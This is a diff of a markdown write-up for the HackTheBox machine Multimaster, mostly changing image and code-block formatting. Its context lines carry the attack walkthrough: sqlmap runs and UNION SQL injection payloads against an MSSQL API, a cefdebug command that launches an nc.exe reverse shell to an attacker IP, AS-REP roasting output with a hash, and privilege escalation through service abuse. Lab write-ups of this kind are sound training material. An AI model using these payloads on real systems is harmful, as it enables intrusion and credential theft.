@@ -117,25 +117,25 @@ SMB does not allow us to access anything without credentials for this machine.
 
 Port 80 shows us a dashboard of some sorts:
 
-<figure><img src="../../../.gitbook/assets/image (2664).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2664).png>)
 
 There were some functions, and the one that stood out was the 'Colleague Finder', which took one name parameter.
 
-<figure><img src="../../../.gitbook/assets/image (2048).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2048).png>)
 
 If nothing is entered, then all the employees are returned.
 
-<figure><img src="../../../.gitbook/assets/image (3520).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3520).png>)
 
 We can take note of these usernames for later. More importantly, we should see how this thing processes queries. When viewed in Burpsuite, the request simply sent a POST request to `/api/getColleagues` and it returns a response.
 
-<figure><img src="../../../.gitbook/assets/image (1706).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1706).png>)
 
 This looks vulnerable to SQL Injection somehow. Every form of injection I tried resulted in a 403 being returned. I noticed one thing however, the `Content-Type` header said that this app accepts UTF-8 characters.
 
 UTF-8 characters are a bit special as they are denoted like `\u12` or something. If I try to use `\u12` as the input, I get an error instead of being blocked.
 
-<figure><img src="../../../.gitbook/assets/image (3809).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3809).png>)
 
 This likely indicates that our query has caused a backend error. Using this, we can try some of the `sqlmap` tampers that are available:
 
@@ -155,7 +155,6 @@ $ sqlmap -r req --tamper=charunicodeescape --level 5 --risk 3 --batch --dbms=mss
 
 > The guess of the DBMS being MS-SQL was purely a guess based on usual HTB machine patterns, but obviously this is not always the case! Windows AD can use SQLite3 or MySQL for their backends, especially for web servers!
 
-{% code overflow="wrap" %}
 ```
 [22:58:39] [INFO] (custom) POST parameter 'JSON #1*' appears to be 'Microsoft SQL Server/Sybase stacked queries (comment)' injectable
 [22:59:04] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
@@ -181,7 +180,6 @@ Parameter: JSON #1* ((custom) POST)
     Title: Generic UNION query (NULL) - 5 columns
     Payload: {"name":"-5737' UNION ALL SELECT 68,68,68,CHAR(113)+CHAR(107)+CHAR(113)+CHAR(107)+CHAR(113)+CHAR(99)+CHAR(103)+CHAR(105)+CHAR(67)+CHAR(121)+CHAR(77)+CHAR(74)+CHAR(122)+CHAR(117)+CHAR(85)+CHAR(75)+CHAR(99)+CHAR(110)+CHAR(99)+CHAR(76)+CHAR(72)+CHAR(99)+CHAR(70)+CHAR(69)+CHAR(77)+CHAR(120)+CHAR(120)+CHAR(107)+CHAR(106)+CHAR(68)+CHAR(103)+CHAR(66)+CHAR(101)+CHAR(104)+CHAR(118)+CHAR(89)+CHAR(79)+CHAR(117)+CHAR(78)+CHAR(113)+CHAR(76)+CHAR(101)+CHAR(67)+CHAR(71)+CHAR(100)+CHAR(113)+CHAR(106)+CHAR(120)+CHAR(106)+CHAR(113),68-- wUMy"}
 ```
-{% endcode %}
 
 Great! Now that we have this, we can attempt to enumerate the database. Here are the results from repeated use of `sqlmap`:
 
@@ -351,29 +349,25 @@ I used this site to encode it into a suitable UTF-8 format:
 
 Testing it worked!
 
-<figure><img src="../../../.gitbook/assets/image (400).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(400).png>)
 
 We can then try to enumerate the Administrator user using this payload:
 
-{% code overflow="wrap" %}
 ```sql
 a' union select 1,1,1,1,(select sys.fn_varbintohexstr(SUSER_SID('megacorp\Administrator')))--
 ```
-{% endcode %}
 
 This would result in some hex being returned:
 
-<figure><img src="../../../.gitbook/assets/image (1038).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1038).png>)
 
 We can use this to send another query that would return usernames and convert the SID for us.
 
-{% code overflow="wrap" %}
 ```sql
 a' union select 1,1,1,1,SUSER_SNAME(0x0105000000000005150000001c00d1bcd181f1492bdfc236f4010000)--
 ```
-{% endcode %}
 
-<figure><img src="../../../.gitbook/assets/image (1240).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1240).png>)
 
 Now, we just need a way to automate this method. I took the two functions used to convert the hex to a valid SID from the user earlier.
 
@@ -384,13 +378,11 @@ S-1-5-21-3167813660-1240564177-918740779-
 
 Then, we can fit this SID into a payload with a test number of 1000.
 
-{% code overflow="wrap" %}
 ```sql
 a' union select 1,1,1,1,(SUSER_SNAME(SID_BINARY('S-1-5-21-3167813660-1240564177-918740779-1000')))--
 ```
-{% endcode %}
 
-<figure><img src="../../../.gitbook/assets/image (915).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(915).png>)
 
 This is the final script I used to automate this method:
 
@@ -506,7 +498,7 @@ SMB         megacorp.local  445    MULTIMASTER      [+] MEGACORP.LOCAL\tushikika
 
 I was then able to `evil-winrm` in as this user:
 
-<figure><img src="../../../.gitbook/assets/image (899).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(899).png>)
 
 ## Privilege Escalation
 
@@ -618,13 +610,13 @@ Start Bloodhound and upload the information as usual. Then, we can check each us
 
 First, we find that `cyork` is part of the Developers group:
 
-<figure><img src="../../../.gitbook/assets/image (2250).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2250).png>)
 
 There are no outbound object controls for this, indicating that this group might have access to somestuff on the machine.
 
 We can also find that the `sbauer` user has some privileges over `jorden`.
 
-<figure><img src="../../../.gitbook/assets/image (2753).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2753).png>)
 
 The rest of the users don't have anything interesting about them. I also used `PrivescCheck.ps1` to enumerate for me since WinPEAS was not working for some reason. Here was the interesting output:
 
@@ -754,13 +746,11 @@ cefdebug.exe : [2023/06/25 22:49:29:8700] U: There are 3 tcp sockets in state li
 
 This exploit was weird, as it took me ages to get a shell, but I eventually did.
 
-{% code overflow="wrap" %}
 ```
 .\cefdebug --code "process.mainModule.require('child_process').exec('C:/Windows/Tasks/nc.exe 10.10.14.42 443 -e cmd')" --url ws://127.0.0.1:2306/58c5d2a4-d072-479b-a0ad-6762d38e5a36
 ```
-{% endcode %}
 
-<figure><img src="../../../.gitbook/assets/image (862).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(862).png>)
 
 ### Inetpub DLL -> Credentials
 
@@ -898,7 +888,7 @@ The `Web.Config` file doesn't seem to use it, making it weirder. I downloaded th
 
 Within it, we can find some hardcoded credentials:
 
-<figure><img src="../../../.gitbook/assets/image (2319).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2319).png>)
 
 Since we have access to the `C:\Users` directory, we can check which user is this password valid with, and `sbauer` is the one!
 
@@ -910,13 +900,13 @@ SMB         megacorp.local  445    MULTIMASTER      [+] MEGACORP.LOCAL\sbauer:D3
 
 We can then `evil-winrm` in as this user:
 
-<figure><img src="../../../.gitbook/assets/image (1366).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1366).png>)
 
 ### GenericWrite -> Jorden Shell
 
 From the Bloodhond we did earlier, we can see that this user has `GenericWrite` privileges over `jorden`:
 
-<figure><img src="../../../.gitbook/assets/image (1908).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1908).png>)
 
 To exploit this, we can use PowerView.ps1. However, it seems AMSI is blocking us:
 
@@ -973,7 +963,6 @@ DONT_REQ_PREAUTH               4194304
 
 Then, we can use `impacket-GetNPUsers` to get the hash required.
 
-{% code overflow="wrap" %}
 ```
 $ GetNPUsers.py -no-pass -dc-ip megacorp.local MEGACORP/jorden
 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
@@ -981,7 +970,6 @@ Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 [*] Getting TGT for jorden
 $krb5asrep$23$jorden@MEGACORP:0bb6522c4c81e9ee90f0cc0bd92e9068$4e27c205e518f96ef14e152bae72576279532f7550e1e86147721862cbffbdd7bf6a0176da066b734fb4a5e8df1ba5384d01f3bc57e732cd4e5d7331e5ff4fc1e298a47dd682b6c2cb837d87bf2eeb3fb43df24f809570ba11bce7c36059a58691893e4a44c82ba07470458b27b055c604c34282b0959b0b199af57a0c7356d052473a36d8f4f3161f3c23f46c99ca37095dded1366b5c6bc73a54f6463591757b79522bee3616ddf845a313bdf1b9524d6c1ab21ac9daf3a8c7e978c9bf9ddae536f224adc1126856897d72c4d812dc6ef745b0f3fb7d95905091d00df296ea87c5d781e8c164bbd430
 ```
-{% endcode %}
 
 This hash can be easily cracked by `john`.
 
@@ -997,7 +985,7 @@ Use the "--show" option to display all of the cracked passwords reliably
 Session completed.
 ```
 
-<figure><img src="../../../.gitbook/assets/image (892).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(892).png>)
 
 ### Server Operators -> Root
 
@@ -1112,6 +1100,6 @@ The first service I noticed were `browser` and `bowser`. I just thought the latt
 *Evil-WinRM* PS C:\Windows\Tasks> sc.exe start browser
 ```
 
-<figure><img src="../../../.gitbook/assets/image (1920).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1920).png>)
 
 Rooted!
